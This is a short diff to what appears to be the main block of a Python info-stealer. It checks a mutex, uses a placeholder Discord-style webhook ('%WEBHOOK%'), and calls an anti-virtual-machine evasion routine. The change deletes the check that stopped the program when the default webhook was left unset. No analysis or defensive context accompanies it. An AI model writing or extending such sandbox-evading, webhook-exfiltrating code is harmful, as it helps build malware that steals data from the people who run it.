@@ -2199,9 +2199,6 @@ if __name__ == '__main__':
             print("mutex already exist")
             os._exit(0)
         else:
-            if webhook == "%WEBHOOK%":
-                print("you are using default webhook, exiting")
-                os._exit(0)
             start_time = time.time()
             if Anti_VM:
                 asyncio.run(AntiVM().Main())
